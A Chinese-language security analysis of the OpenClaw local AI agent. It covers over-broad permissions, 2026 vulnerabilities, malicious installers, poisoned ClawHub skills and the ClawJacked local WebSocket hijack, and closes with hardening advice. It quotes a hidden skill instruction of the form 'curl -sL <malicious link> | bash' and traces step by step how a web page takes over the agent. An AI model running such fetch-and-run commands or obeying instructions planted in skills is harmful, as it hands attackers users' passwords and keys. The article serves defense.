# OpenClaw 安全性深度分析：当 AI 代理获得系统级权限后

## 一句话结论

OpenClaw 不是普通聊天 AI，而是一款"操作系统级"的本地 AI 代理——它能执行终端命令、读写文件、访问云服务，权限之大决定了其安全风险远高于一般 AI 工具。只有懂技术、能控制权限的人，才该使用它。

---

## 项目背景与热度

OpenClaw（前称 Clawdbot、Moltbot）是一款本地部署的开源 AI 代理，由 Peter Steinberger 开发，主打"一人一代理"的概念。自 2025 年 11 月推出以来爆发增长：截至 2026 年 3 月，GitHub 星标已超过 27 万，成为全球增长最快的开源项目之一。

OpenClaw 的核心价值在于实现"全自动任务执行"——无需人工反复干预，就能自主完成邮件沟通、数据查询、工具调用、任务协调等一系列操作，相当于给每个人配备了一个"全能 AI 助手"。

需要注意的是，OpenClaw 的设计假设**信任部署环境**：官方安全文档明确指出"个人助手信任模型：每个网关对应一个信任边界，非支持恶意多租户"。换言之，原厂期望用户仅在本地单一操作者场景下使用，不建议多人共用或公开部署。

---

## 架构与能力边界

OpenClaw 核心由一套 Gateway + Node（设备）架构组成：Gateway 是本地运行的 WebSocket 服务（默认监听 `127.0.0.1:18789`），负责身份验证、聊天会话管理和指令调度；Node 向 Gateway 注册并公开自身能力（如运行 Shell 命令、读写文件、操控摄像头、麦克风、定位、剪贴板等）。

关键能力包括：

- **多渠道集成**：内置对 WhatsApp、Telegram、Signal、Slack、Discord、Microsoft Teams、SMS、邮件等的接入支持
- **文件与浏览器控制**：可开启浏览器控制功能，让代理打开浏览器导航网页；可通过文件工具访问本地文件系统
- **任意 Shell 命令执行**：由于代理可以执行任意 Shell 命令，若开启权限即具有完整的系统控制能力
- **插件与技能扩展**：支持用 JavaScript/TypeScript 插件和 ClawHub 技能包扩展功能

**能力边界总结**：OpenClaw 本质上是一个高权限的 AI 代理平台，能接入各种通讯工具、执行系统命令、读写文件，能力类似操作系统级的机器人。"它做的事"远超普通聊天 AI，因此需要相应的安全模型来限制其行为范围和交互对象。

---

## 核心安全问题

### 问题一：过度授权

OpenClaw 的设计要求它能够读写整个文件系统、调用外部命令、进行广泛的网络通信。这意味着 AI 代理不仅能在应用层操作，还能触及底层系统资源。

这种设计将巨大的信任交给了 AI 代理本身及其所依赖的第三方代码。一旦这个高权限的代理被恶意利用，其造成的破坏将是灾难性的——它不仅可以读取用户的私人邮件、文档、聊天记录和日历，还可以访问存储在各种配置文件中的 API 密钥、密码和私钥等高度敏感信息。

### 问题二：信任边界模糊

OpenClaw 的安全性基于"受操作信任成员"模型。在默认配置下，系统假设任何能够访问网关端口并通过身份验证的调用者均为受信任的管理者。

争议在于其"主机优先"执行模式：默认情况下，沙箱模式处于关闭状态，工具直接在网关运行的宿主机环境中执行。这意味着 OpenClaw 继承了当前用户的完整操作系统权限。

### 问题三：数据引力与机密聚合

OpenClaw 将所有的会话历史记录、记忆与配置以纯文本形式存储在本地磁盘上。当用户为了追求便利，将企业邮件、SaaS 平台依赖（OAuth Token）、甚至是 API 密钥授权给 OpenClaw 时，它便成为了一个高价值的机密聚合点。

一旦 OpenClaw 实例被攻破，攻击者的收获将远远超出单一服务的泄露。

## 已知漏洞与安全事件时间线

### 2026 年 1 月：RCE 漏洞修复

OpenClaw 发布 v2026.1.29 版本，修复了远程代码执行（CVE-2026-25253）、SSH 命令注入（CVE-2026-25157）和 Docker 沙箱逃逸（CVE-2026-24763）等重大安全漏洞。

### 2026 年 2 月上旬：配置缺陷暴露

安全研究者发现 OpenClaw 安装配置的重大缺陷——默认绑定所有网络接口（`0.0.0.0:18789`），导致大量实例直接暴露于互联网中。

SecurityScorecard STRIKE 团队扫描结果显示，截至 2 月 9 日，全球至少有 42,900 个 OpenClaw 实例暴露互联网，其中约 15,200 个存在已知 RCE 漏洞（占三分之一）。

### 2026 年 2 月 9 日：恶意安装包事件

攻击者通过 Bing AI 搜索将用户引导至恶意 GitHub 仓库（如 `openclaw-installer`），分发伪造 OpenClaw Windows 安装包。受害者下载安装后，该伪装程序加载了 Vidar 信息窃取器和 GhostSocks 代理木马，将主机变为犯罪分子流量转发节点。

### 2026 年 2 月中旬：ClawHub 供应链危机

安全研究员发现多达 1184 个欺诈技能，其中一个攻击者上传了 677 个欺诈包。这些技能伪装成常见助手（如"做什么 Elon 会做"），在 `SKILL.md` 中隐藏了恶意指令（如`curl -sL 恶意链接 | bash`），部署 AMOS 窃取用户浏览器密码、SSH 密钥、API 密钥等敏感数据。

### 2026 年 2 月 25-26 日：ClawJacked 漏洞

Oasis Security 公布了 **ClawJacked** 漏洞技术分析，揭示任何网站均可通过浏览器静默地对本地 OpenClaw 进行暴力破解。一旦成功，该网站能注册为受信设备、控制 AI 代理、读取日志等。

攻击路径：用户正常浏览网页时误入钓鱼网站 → 网站的 JavaScript 利用浏览器允许本地 WebSocket 连接 → 连接到`localhost:18789` → 高速暴力破解代理密码（本地连接不受失败限速）→ 密码被猜中后自动与代理建立新设备会话 → 攻击者拥有管理员权限 → 执行任意命令或读写配置。

当天下午，OpenClaw 团队即发布 v2026.2.25 版本修复了本地 WebSocket 连接的来源校验与失败节流问题。

## 攻击面分类

OpenClaw 的攻击面可分为以下主要类别：

### 核心平台（Gateway/节点）

漏洞或配置不当的本地代理本身是最大风险源。包括前述的 ClawJacked 漏洞（利用本地 WebSocket 信任绕过）、配置缺省绑定所有地址、默认密码保护弱等问题。

这类攻击如果成功，等同于完全接管用户环境——攻击者可以通过代理的 `system.run` 等工具执行任意命令。

### 生态供应链（ClawHub 技能与插件）

第三方技能市场极易被投毒。研究表明，ClawHub 容许几乎零门槛发布，攻击者上传了上千个恶意技能。一旦用户安装，这些技能就可执行隐藏的恶意指令（下载并运行窃密程序）。

此外，GitHub 插件源若不可信亦可引入后门；官方建议将插件视为高权限代码，最好使用精确版本并审查其源代码。

### 分发渠道与版本伪造

热门项目容易遭遇假冒下载。攻击者通过虚假 GitHub 仓库传播恶意"安装包"（分发层面攻击）。用户一旦执行，即感染信息窃取器。

### 运行环境与部署配置

OpenClaw 默认全网监听和高权限运行，这使得部署环境本身成攻击面。截至 2 月，已有上万实例因默认设置暴露互联网。

### 权限滥用

官方配置中，代理会话默认在主机上直接运行指令，意味着授权给 OpenClaw 的任何权限都相当于赋予了该程序系统级控制权。

- 在最坏情况下，任何级别的 OpenClaw 漏洞都可让攻击者获得系统权限

## 防护策略与最佳实践

### 安装与部署

- 严格从官网或 GitHub 官方仓库下载安装，验证哈希值
- 更新至最新安全版本（如 2026.2.25+）
- 部署时只监听本地接口（`127.0.0.1:18789`），关闭不必要的网络访问
- 切勿将 Gateway 端口直接暴露于公网，使用 SSH 隧道或 VPN 隔离管理界面
- 为每个用户或用途分别部署代理实例，避免多人共用一个 Gateway

### 权限与隔离

- 给 OpenClaw 运行账户分配最小权限
- 可考虑在虚拟机或容器中运行代理
- 避免以管理员/Root 身份运行，并限制可访问目录
- 官方建议对群组会话启用 Docker 沙箱，将非主会话与主机隔离
- 如果使用 Node 引入浏览器控件、摄像头等设备，请事先评估风险，不必功能时禁用

### 渠道与身份控制

- 严格设置消息渠道的允许列表
- 关闭公开对话选项，仅与可信联系人配对聊天
- 对群聊启用必须@提及策略，避免代理响应未知消息
- 定期审查设备/用户列表，撤销已不再使用的设备

### 技能与插件管理

- 只从可信开发者处获取技能或插件
- 对于 ClawHub 技能，可事先查看脚本内容，或借助安全工具扫描
- 使用固定版本号安装插件（避免 `latest` 标签），并在升级前备份配置以便回滚
- 定期运行安全审计以发现高风险插件或滥用配置

### 凭证与秘密治理

- 避免将敏感凭证直接存储在 OpenClaw 配置或会话中
- 对于必需的 API 密钥，应使用最短有效期的令牌，并赋予仅能访问必需资源的权限
- 建议为代理创建专用的非人类服务身份（如专属账号），并限制其权限和网络访问
- 所有代理相关的密钥、凭据应进行加密存储，并启用轮换策略

### 审计与监控

- 开启 OpenClaw 日志记录和会话审核功能
- 记录代理执行的命令、API 调用和关键信息访问日志，并定期检查异常行为
- 企业环境中可将代理流量通过 SIEM 监控，检测可能的提示注入或循环任务
- 一旦怀疑代理被入侵，应立即隔离该实例网络并重置所有相关密钥

## 结论与建议

OpenClaw 功能强大但并非"即插即用"的安全产品。使用时应秉持"隔离即安全"的原则，将其视作本地运行的服务而非简单应用。

**核心论点总结**：

1. **OpenClaw 不是普通聊天 AI**，而是一款"操作系统级"的本地 AI 代理，权限之大决定了其安全风险
2. **信任边界仅限个人使用**，官方文档明确"单个信任操作者模型"，不支持多人共享
3. **ClawHub 供应链存在严重后门风险**，1184 个欺诈技能包含窃密指令
4. **ClawJacked 漏洞证明了过度信任本地**，任何访问过本站的网页都可尝试连接本地 OpenClaw
5. **默认配置是安全隐患**，上万实例暴露公网，企业和个人都可能成为无意中的"开放攻击面"
6. **防护基石是最小权限和隔离**，在隔离的虚拟机/容器运行 OpenClaw，严格限制代理的网络和系统权限

**最终建议**：

对初级用户，建议仅在无需保护的隔离环境中试用，并严格避免输入敏感个人信息。

对开发者和企业，则需综合加固：最小权限、强认证、定期审计，以及供应链透明度。

OpenClaw 值得关注，但不是适合所有人的安全助手。只有懂技术、能控制权限的人，才该使用它。对于普通用户，则更应观望或在封闭环境下试用，不要盲目将其视为"天生安全"的工具。
